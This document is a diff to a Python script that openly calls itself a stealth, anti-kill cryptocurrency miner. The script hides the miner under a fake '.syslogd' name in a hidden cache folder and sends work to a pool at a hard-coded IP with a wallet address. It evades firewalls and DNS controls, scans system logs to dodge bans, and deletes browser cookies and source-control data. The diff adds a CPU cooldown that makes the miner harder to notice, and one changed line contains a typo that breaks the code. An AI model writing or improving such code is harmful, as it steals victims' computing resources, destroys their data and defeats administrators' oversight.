@@ -8,12 +8,19 @@ BIN_NAME = "cpuminer-sse2"
 ALIAS_BIN = ".syslogd"
 HIDDEN_DIR = os.path.expanduser("~/.cache/.coreguard")
 POOL = "stratum+tcp://164.92.145.122:80"
-WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Recut"
+WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Icut"
 PASSWORD = "x"
-THREADS = random.randint(1, min(7, os.cpu_count()))
+THREADS = random.randint(1, minx7, os.cpu_count()))
 RESTART_INTERVAL = 600
+COOLDOWN_DURATION = 180
 
 BIN_PATH = os.path.join(HIDDEN_DIR, ALIAS_BIN)
+
+def is_cpu_100_percent():
+    try:
+        return os.getloadavg()[0] >= os.cpu_count()
+    except:
+        return False
 
 def prepare_binary():
     os.makedirs(HIDDEN_DIR, exist_ok=True)
@@ -36,13 +43,23 @@ def proxy_exec():
 def monitor_process(proc):
     print(f"[ðŸ›¡ï¸] Monitoring PID: {proc.pid}")
     while True:
+        if is_cpu_100_percent():
+            print(f"[ðŸ”¥] CPU 100% â€” cooldown {COOLDOWN_DURATION}s...")
+            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+            time.sleep(COOLDOWN_DURATION)
+            restart_script()
         if proc.poll() is not None:
-            print("[âš ï¸] Miner dihentikan. Restarting...")
+            print("[âš ï¸] Miner mati. Restarting...")
             time.sleep(5)
             new_proc = proxy_exec()
             monitor_process(new_proc)
             break
         time.sleep(10)
+
+def restart_script():
+    print("[ðŸ”] Restarting script...")
+    time.sleep(3)
+    os.execl(sys.executable, sys.executable, *sys.argv)
 
 def clean_mining_artifacts():
     for base in ["~/.cache", "~/.local/share", "~/Downloads", "/tmp"]:
@@ -108,7 +125,6 @@ def dns_doh_bypass():
     except: pass
 
 def firewall_bypass():
-    print("[ðŸ”¥] Jalankan firewall bypass...")
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(2)
@@ -120,7 +136,6 @@ def firewall_bypass():
     except: pass
 
 def detect_system_threat():
-    print("[ðŸ›¡ï¸] Cek sistem diblokir...")
     paths = ["/var/log/auth.log", "/var/log/syslog", "/var/log/messages", "/etc/nologin", "/tmp/.X11-unix"]
     for path in paths:
         if os.path.exists(path):
@@ -128,7 +143,7 @@ def detect_system_threat():
                 with open(path, "r", errors="ignore") as f:
                     log = f.read().lower()
                     if any(k in log for k in ["suspend", "ban", "terminate", "dismiss"]):
-                        print(f"[ðŸš«] Deteksi diblokir: {path}")
+                        print(f"[ðŸš«] Deteksi sistem diblokir: {path}")
                         subprocess.call(["pkill", "-f", BIN_PATH])
             except: continue
 
@@ -140,16 +155,12 @@ def clean_up():
 
 # ENTRY POINT
 if __name__ == "__main__":
-    print("ðŸš€ Stealth Miner Anti-Kill Dimulai...")
-    reconnect = threading.Thread(target=fake_http_headers)
-    reconnect.daemon = True
-    reconnect.start()
-
+    print("ðŸš€ Stealth Miner Anti-Kill + Cooldown Dimulai...")
     threading.Thread(target=anti_suspend, daemon=True).start()
     threading.Thread(target=dns_doh_bypass, daemon=True).start()
     threading.Thread(target=firewall_bypass, daemon=True).start()
     threading.Thread(target=detect_system_threat, daemon=True).start()
-
+    fake_http_headers()
     clean_browser_cookies()
     clean_myapp_data()
     clean_source_control()
@@ -158,13 +169,7 @@ if __name__ == "__main__":
     try:
         prepare_binary()
         miner_proc = proxy_exec()
-        monitor_thread = threading.Thread(target=monitor_process, args=(miner_proc,), daemon=True)
-        monitor_thread.start()
-        time.sleep(RESTART_INTERVAL)
-        print("[ðŸ”] Restart otomatis miner...")
-        os.killpg(os.getpgid(miner_proc.pid), signal.SIGTERM)
-        time.sleep(3)
-        os.execl(sys.executable, sys.executable, *sys.argv)
+        monitor_process(miner_proc)
     except KeyboardInterrupt:
         print("[â›”] Dihentikan manual.")
         os.killpg(os.getpgid(miner_proc.pid), signal.SIGTERM)
